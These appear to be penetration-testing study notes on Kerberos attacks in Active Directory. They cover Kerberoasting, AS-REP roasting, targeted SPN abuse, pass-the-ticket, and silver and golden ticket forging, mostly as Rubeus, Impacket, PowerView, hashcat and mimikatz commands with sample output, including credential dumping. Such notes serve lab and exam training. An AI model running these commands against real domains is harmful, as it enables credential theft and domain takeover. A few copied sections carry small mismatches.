# Kerberos Attacks

1. [Kerberoasting](#kerberoasting)  
	- [Find Kerberoastable Users](#find-kerberoastable-users)  
	- [Rubeus: Kerberoasting Tool](#rubeus-kerberoasting-tool)  
	- [Impacket: Kerberoasting](#impacket-kerberoasting)  
2. [AS-REP Roasting](#as-rep-roasting)  
	- [Find AS-REP Roastable Users](#find-as-rep-roastable-users)  
	- [AS-REP Roast from Linux](#as-rep-roast-from-linux)  
3. [Targeted Kerberoasting](#targeted-kerberoasting)  
4. [Delegation Candidates](#delegation-candidates)  
5. [Pass-the-Ticket](#pass-the-ticket)  
6. [Silver Tickets](#silver-tickets)  
	- [Mimikatz: Silver Ticket](#mimikatz-silver-ticket)  
7. [Mimikatz: Golden Ticket](#mimikatz-golden-ticket)

Kerberos = main authentication protocol used in AD (since 2003)
- uses ticket system (vs MIT ver using challenge and response)  

| Protocol | Basic Idea                                        | Why It Matters                       |
| -------- | ------------------------------------------------- | ------------------------------------ |
| Kerberos | Client authenticates to KDC and receives tickets  | Ticket abuse / roasting possible     |
| NTLM     | Client authenticates directly with target service | Relay / pass-the-hash paths possible |

Quick Terminology List
```text
Kerberos = ticket-based auth  
KDC = Key Distribution Center  
DC = KDC  
TGT = Ticket Granting Ticket - encrypted with krbtgt hash  
TGS = Ticket Granting Service ticket - encrypted with service account hash
SPN = Service Principal Name  
krbtgt = AD account used by KDC to sign/encrypt TGTs

AS-REQ	= Initial auth request to KDC
AS-REP	= Initial auth reply from KDC
TGS-REQ = Request for service ticket
TGS-REP	= Service ticket response
AP-REQ = Request sent to service using service ticket
PAC = Privileged Attribute Certificate; contains user/group info
```


| Finding                        | Attack                               | Next Step                     |
| ------------------------------ | ------------------------------------ | ----------------------------- |
| User has SPN                   | Kerberoasting                        | Request TGS and crack         |
| User has pre-auth disabled     | AS-REP Roasting                      | Request AS-REP and crack      |
| `GenericWrite` over user       | Targeted Kerberoast                  | Add SPN, request TGS, cleanup |
| `GenericAll` over user         | Targeted Kerberoast / password reset | Choose less disruptive path   |
| Service account hash recovered | Silver Ticket                        | Forge ticket for specific SPN |
| krbtgt hash recovered          | Golden Ticket                        | Forge TGT                     |
| `AllowedToDelegate`            | Delegation abuse                     | Validate delegation path      |
| `AllowedToAct` / RBCD          | RBCD abuse                           | Validate computer object path |
| Valid `.kirbi` / `.ccache`     | Pass-the-Ticket                      | Inject/use ticket             |

| Attack                 | Requirement                                 | Output / Goal         | Notes                                          |
| ---------------------- | ------------------------------------------- | --------------------- | ---------------------------------------------- |
| Kerberoasting          | Valid domain user + SPN user accounts       | `TGS` hash            | Offline cracking                               |
| `AS-REP` Roasting      | User with pre-auth disabled                 | `AS-REP` hash         | May work without password                      |
| Targeted Kerberoasting | Write rights over target user               | Add `SPN` → roast     | Usually via `GenericWrite` / `GenericAll`      |
| Pass-the-Ticket        | Valid Kerberos ticket                       | Access as ticket user | Lateral movement                               |
| Silver Ticket          | Service account hash + domain `SID` + `SPN` | Forged service ticket | Specific service only                          |
| Golden Ticket          | krbtgt hash + domain `SID`                  | Forged `TGT`          | Domain-wide, post-compromise                   |
| Delegation Abuse       | Delegation misconfig                        | Impersonation path    | Put details in delegation/domain-privesc notes |

| Attack                     | Hash Type        | Hashcat Mode |
| -------------------------- | ---------------- | ------------ |
| Kerberoasting              | TGS-REP etype 23 | `13100`      |
| AS-REP Roasting            | AS-REP etype 23  | `18200`      |
| Kerberoasting AES etype 17 | TGS-REP AES128   | `19600`      |
| Kerberoasting AES etype 18 | TGS-REP AES256   | `19700`      |
| Kerberos pre-auth etype 17 | Pre-auth AES128  | `19800`      |
| Kerberos pre-auth etype 18 | Pre-auth AES256  | `19900`      |

### Kerberos Quick Flow

#### 1. User Authentication  
1. User logs in  
2. `AS-REQ` -> sent to DC/KDC  
3. KDC validates user using password hash from `ntds.dit`  
4. `AS-REP` -> returned to client  
5. Client receives session key + `TGT`  
#### 2. Accessing a Service  
1. Client wants service access  
2. `TGS-REQ` -> sent with `TGT` + requested `SPN`  
3. KDC validates `TGT`  
4. `TGS` / service ticket -> returned  
5. `AP-REQ` -> sent to service  
6. Service decrypts ticket using service account hash  
7. Access allowed/denied based on ticket + group/permission info


---
## Kerberoasting

Kerberoasting = abuses the fact that any authenticated domain user can request a service ticket for an `SPN` 
-> returned `TGS` is encrypted with the service account’s password hash 
-> decrypt hash using brute force 

Basic Kerberoasting Flow
1. Valid domain user  
    -> can query AD + request service tickets
2. Find accounts with SPNs  
    -> identify Kerberoastable accounts
3. Request `TGS` for `SPN`  
    -> ticket encrypted with service account hash
4. Extract `TGS` hash  
    -> save hash on Kali
5. Crack hash offline  
    -> no more interaction with DC needed
6. If cracked  
    -> recover service account password  
    -> test creds for access / privesc


---

### Find Kerberoastable Users
Find SPNs with native command:
```cmd
:: Native command
setspn -L SERVICE_ACCOUNT

Registered ServicePrincipalNames for CN=SERVICE_ACCOUNT,CN=Users,DC=domain,DC=com:
        HTTP/WEB_HOSTNAME.domain.com
        HTTP/WEB_HOSTNAME
        HTTP/WEB_HOSTNAME.domain.com:80
```

Find using ldapsearch and powerview
```powershell
# using ldapsearch 
LDAPSearch -LDAPQuery "(&(objectCategory=user)(servicePrincipalName=*))"

# powerview
Get-DomainUser -SPN
```
user account + SPN may be Kerberoastable  

best targets list
```text
SPN running under normal domain user account
e.g. 
		iis_service
		sql_service
		svc_backup
		svc_web
user-managed service accounts often have human-created passwords  
human-created passwords = more likely crackable

high-priv service account + SPN + old/weak password =D target
```

bad targets
```text
computer accounts
managed service accounts / MSA
group managed service accounts / gMSA
krbtgt
- note
  krbtgt = KDC service account - not a normal service account target  
```

[bloodhound reference guide](../03-tools/bloodhound.md)
- `GenericWrite` or `GenericAll` -> Targeted Kerberoasting 
		→ add fake SPN  
		→ request TGS  
		→ crack hash  
		→ remove fake SPN


---

### Rubeus: Kerberoasting Tool

```powershell 
PS C:\Tools> .\Rubeus.exe kerberoast /outfile:hashes.kerberoast  
  
   ______        _  
  (_____ \      | |  
   _____) )_   _| |__  _____ _   _  ___  
  |  __  /| | | |  _ \| ___ | | | |/___)  
  | |  \ \| |_| | |_) ) ____| |_| |___ |  
  |_|   |_|____/|____/|_____)____/(___/  
  
  v2.1.2  
  
[*] Action: Kerberoasting
[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.
[*] Target Domain          : domain.com
[*] Searching path 'LDAP://DC01.domain.com/DC=domain,DC=com' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'
[*] Total kerberoastable users : 1
[*] SamAccountName         : iis_service
[*] DistinguishedName      : CN=iis_service,CN=Users,DC=domain,DC=com
[*] ServicePrincipalName   : HTTP/WEB_HOSTNAME.DOMAIN.com:80
[*] PwdLastSet             : DATE_TIME
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash written to C:\Tools\hashes.kerberoast
t
[*] Roasted hashes written to : C:\Tools\hashes.kerberoast
```  

review on Kali to crack TGS-REP hash  
```bash  
└─$ cat hashes.kerberoast                                                
$krb5tgs$23$*iis_service$domain.com$HTTP/WEB_HOSTNAME.domain.com:80@domain.com*$REDACTED_HASH_____...
  
└─$ hashcat --help | grep -i "kerberos"      
  19600 | Kerberos 5, etype 17, TGS-REP                       | Network Protocol 
  19800 | Kerberos 5, etype 17, Pre-Auth                      | Network Protocol 
  19700 | Kerberos 5, etype 18, TGS-REP                       | Network Protocol 
  19900 | Kerberos 5, etype 18, Pre-Auth                      | Network Protocol 
   7500 | Kerberos 5, etype 23, AS-REQ Pre-Auth               | Network Protocol 
  13100 | Kerberos 5, etype 23, TGS-REP                       | Network Protocol 
  18200 | Kerberos 5, etype 23, AS-REP                        | Network Protocol
```  
  
```bash
#  TGS-REP  13100
└─$ sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule 
...  
$krb5tgs$23$*iis_service$domain.com$HTTP/WEB_HOSTNAME.domain.com:80@domain.com*$51b8dd2016
...  
:iis_service_pw  # <- pw of iis_service found!
...  
```  
[hashcat reference page](../03-tools/hashcat_johntheripper.md)


---

### Impacket: Kerberoasting

```bash
sudo impacket-GetUserSPNs domain.com/domain_user -request -dc-ip DC_IP
```

```bash
└─$ sudo impacket-GetUserSPNs domain.com/alice -request -dc-ip DC_IP    

Password:  
ServicePrincipalName    Name         MemberOf  PasswordLastSet             LastLogon  Delegation  
----------------------  -----------  --------  -------------------------- HTTP/WEB_HOSTNAME.domain.com:80  iis_service  DATE_TIME unconstrained              
[-] CCache file is not found. Skipping...  
$krb5tgs$23$*iis_service$DOMAIN.COM$domain.com/iis_service*$REDACTED_HASH ...
```  
[impacket reference page](../03-tools/impacket.md)

```bash
john kerberoast.hash --wordlist=wordlist.txt

sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule 
```

```bash
kali@kali:~$ sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule 

...  
$krb5tgs$23$*iis_service$domain.COM$domain.com/iis_service*$REDACTED_HASH$REDACTED_HASH:iis_service_pw  
```  
  [hashcat and john reference page](../03-tools/hashcat_johntheripper.md)

Debugging Reference
- forgetting `-request`, which may only list SPNs without dumping TGS hashes
- using target host IP instead of DC IP for `-dc-ip`
- copying only part of the `$krb5tgs$...` hash
- not syncing time when Kerberos throws clock skew errors
- assuming cracked service creds are automatically admin
- not checking delegation info / group membership after finding service accounts

```
note: if output = KRB_AP_ERR_SKEW(Clock skew too great) 
		-> Kali time and DC time differ
		-> sync Kali time to DC 
```

```bash
sudo ntpdate DC_IP
sudo rdate -n DC_IP

# now retry
sudo impacket-GetUserSPNs domain.com/alice -request -dc-ip DC_IP
```


---

## AS-REP Roasting

AS-REP Roasting targets users with Kerberos pre-authentication disabled.
Normal users must prove they know their password before receiving AS-REP material.

1. If pre-auth is disabled:
2. attacker can request AS-REP   
3. KDC returns encrypted material  
 4. crack offline

AS-REP Notes
```
=D when:
	pre-auth disabled  
	weak password  
	valid username list
```

```
AS-REP roast != Kerberoast  
different hash type  
different hashcat mode
```

#### Find AS-REP Roastable Users

```powershell
# ldapsearch
LDAPSearch -LDAPQuery "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))"

# powerview
Get-DomainUser -PreauthNotRequired

#BloodHound:
ASREPRoastable
```

#### AS-REP Roast from Linux

Without credentials, if you have a username list:

```bash
impacket-GetNPUsers domain.com/ -usersfile users.txt -dc-ip dc_ip -no-pass -format hashcat
```

```bash
impacket-GetNPUsers domain.com/alice:'alice_password' -dc-ip dc_ip -request -format hashcat`
```

```bash
#  18200 = Kerberos 5, etype 23, AS-REP

nano asrep_hashes.txt

hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```


---

## Targeted Kerberoasting

1. Valid domain user  
    -> can query AD + request service tickets
2. Find accounts with SPNs  
    -> identify Kerberoastable accounts
3. Request `TGS` for `SPN`  
    -> ticket encrypted with service account hash
4. Extract `TGS` hash  
    -> save hash on Kali
5. Crack hash offline  
    -> no more interaction with DC needed
6. If cracked  
    -> recover service account password  
    -> test creds for access / privesc

PowerView
```powershell
# Create creds if needed:
$SecPassword = ConvertTo-SecureString 'alice_password' -AsPlainText -Force  
$Cred = New-Object System.Management.Automation.PSCredential('domain.com\alice',$SecPassword)

# Set fake SPN:
Set-DomainObject -Credential $Cred -Identity target_user -Set @{serviceprincipalname='nonexistent/service'}

# Request ticket:
Get-DomainSPNTicket -Credential $Cred target_user | fl

# Save hash to Kali and crack:
hashcat -m 13100 targeted_kerberoast.txt /usr/share/wordlists/rockyou.txt

# Cleanup:
Set-DomainObject -Credential $Cred -Identity target_user -Clear serviceprincipalname

# Verify cleanup:
Get-DomainUser target_user -Properties serviceprincipalname
```


---

## Delegation Candidates
```powershell
# powerview
Get-DomainComputer -Unconstrained
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth
```

Bloodhound edges:
[bloodhound reference guide](../03-tools/bloodhound.md)
```
AllowedToDelegate
AllowedToAct
AddAllowedToAct
```

Record:
```
delegation type:  
controlled account:  
target computer/service:  
SPN:  
possible impersonation target:  
required ticket/tool:
```
delegation findings can create Kerberos attack paths


---

## Pass-the-Ticket

Pass-the-Ticket = inject/use a Kerberos ticket to authenticate as the ticket principal.
	you have a valid `.kirbi` / `ccache` ticket  
	you want to access a service without password/hash

```powershell
# Windows with Rubeus:
.\Rubeus.exe ptt /ticket:BASE64_TICKET

# Mimikatz:
kerberos::ptt ticket.kirbi

# Check tickets:
klist

# Linux:
export KRB5CCNAME=ticket.ccache

# Example Kerberos auth with Impacket:
impacket-psexec -k -no-pass domain.com/alice@target_host
```

```
1. service ticket is encrypted with service account hash  
2. if we know service account hash  
3. we can forge service ticket for that service  
4. service may trust ticket if PAC validation is not enforced
```


---

## Silver Tickets  

Silver Ticket = forged service ticket for a specific service/SPN.

need
```powershell 
domain SID  
domain name  
target hostname / FQDN  
target service/SPN  
service account NTLM hash  
username to impersonate
```

```
domain SID      = S-1-5-21-1111111111-2222222222-3333333333
domain          = domain
target          = web_hostname.domain
service         = http
service hash    = ntlm_hash
forged user     = alice_admin
```

example target services 
```powershell
HTTP  
CIFS  
MSSQLSvc  
HOST  
LDAP

HTTP/web01.domain.com
CIFS/fileserver01.domain.com  
MSSQLSvc/sql01.domain.com
```

| Requirement       | Example                                     |
| ----------------- | ------------------------------------------- |
| Domain            | `domain.com`                              |
| Domain SID        | `S-1-5-21-1111111111-2222222222-3333333333` |
| Service hash      | `ntlm_hash`                                 |
| Target SPN host   | `web01.domain.com`                        |
| Service type      | `http`, `cifs`, `mssqlsvc`                  |
| Username to forge | `alice_admin`                               |

PAC  (Privileged Attribute Certificate)
- optional verification process between SPN & DC  
- if enabled -> user auth to service & priv validated by DC  
- but service apps rarely use PAC validation  
- PAC validation = optional check where the service asks the DC/KDC to verify the PAC

Silver Ticket Attack Vector
1. Service ticket is encrypted with the service account hash  
2. If we know the service account hash  -> we can forge a service ticket for that service  
3. Present forged service ticket to the target service  
4. Service may trust the ticket  -> especially if PAC validation is not enforced  
5. If accepted  -> access service as the forged user/context

Find Domain SID
```cmd
whoami /user

User Name SID  
========= =============================================  
domain.com\alice S-1-5-21-1111111111-2222222222-3333333333-1105

:: alice sid  : S-1-5-21-1111111111-2222222222-3333333333-1105
:: DOMAIN SID : S-1-5-21-1111111111-2222222222-3333333333
```


#### mimikatz: Silver Ticket

[mimikatz reference guide](../03-tools/mimikatz.md)

Silver Ticket = include `/service` + `/target` + `service account hash`.

| Option      | Meaning                                       |
| ----------- | --------------------------------------------- |
| `/sid:`     | domain SID                                    |
| `/domain:`  | AD domain name                                |
| `/ptt`      | pass ticket directly into current session     |
| `/target:`  | target host / FQDN for SPN                    |
| `/service:` | service type, e.g. `http`, `cifs`, `mssqlsvc` |
| `/rc4:`     | NTLM hash of service account                  |
| `/user:`    | username to place in forged ticket            |
e.g. using `alice_admin` and `http`: 

e.g. mimikatz `sekurlsa::logonpasswords`
```powershell 
#  local admin on machine where iis_service established session  
#  run mimikatz as local admin
mimikatz # privilege::debug  
Privilege '20' OK  
  
mimikatz # sekurlsa::logonpasswords  
  
Authentication Id : 0 ; 1147751 (00000000:ID_NUM)  
Session           : Service from 0  
User Name         : iis_service  
Domain            : domain  
Logon Server      : DC01  
Logon Time        : DATE_TIME  
SID               : S-1-5-21-REDACTED-REDACTED-REDACTED-XXXX  
        msv :  
         [00000003] Primary  
         * Username : iis_service  
         * Domain   : domain  
         * NTLM     : REDACTED_NTLM_HASH  # use for silver ticket!
         * SHA1     : REDACTED_HASH  
         * DPAPI    : REDACTED_DPAPI  
...  
```  

  e.g. mimikatz `kerberos::golden`
```powershell
kerberos::golden /sid:S-1-5-21-1111111111-2222222222-3333333333 /domain:domain.com /ptt /target:web_hostname.domain.com /service:http /rc4:ntlm_hash /user:alice_admin
```

```powershell
klist

Cached Tickets: (1)

#0>     Client: alice_admin @ domain.com
        Server: http/WEB_HOSTNAME.domain.com @ domain.com
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0xHEX_REDACTED -> forwardable renewable pre_authent
        Start Time: DATE_TIME_REDACTED
        End Time:   DATE_TIME_REDACTED
        Renew Time: DATE_TIME_REDACTED
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0
        Kdc Called:
```

```powershell
iwr -UseDefaultCredentials http://web_hostname.domain.com

StatusCode : 200  
StatusDescription : OK
```

Limitations
	specific service only  - `/target` must match the service hostname/SPN
	hostname/SPN must match  - `/service` must match the service type, e.g. `http`, `cifs`
	requires service account hash  - need the correct service account NTLM hash
	PAC validation may affect abuse  - if service validates PAC with DC, forged ticket may fail
	can be noisy / high impact -> use carefully in labs/exam only

### mimikatz: Golden Ticket

Golden Ticket = forged TGT 
	-> domain-wide ticket forging  
	-> post-domain-compromise technique

note: 
- Usually beyond initial AD enum.  
- Relevant when krbtgt hash is obtained through DCSync / NTDS dump
	-> [domain priv esc guide](../06-active-directory/domain-privesc.md)

requirement:
```
krbtgt hash  
domain SID  
domain name
```

[mimikatz reference guide](../03-tools/mimikatz.md)
```powershell
kerberos::golden /user:alice_admin /domain:domain.com /sid:S-1-5-21-1111111111-2222222222-3333333333 /krbtgt:krbtgt_ntlm_hash /ptt
```

```powershell
klist

Cached Tickets: (1)

#0>     Client: alice_admin @ domain.com
        Server: krbtgt/domain.com @ domain.com
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0xHEX_REDACTED -> forwardable renewable pre_authent
        Start Time: DATE_TIME_REDACTED
        End Time:   DATE_TIME_REDACTED
        Renew Time: DATE_TIME_REDACTED
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0
        Kdc Called:
```

```powershell
iwr -UseDefaultCredentials http://web_hostname.domain.com

StatusCode : 200  
StatusDescription : OK

# :D forged service ticket + access web page as `alice_admin`  
# test with domain service as well
```

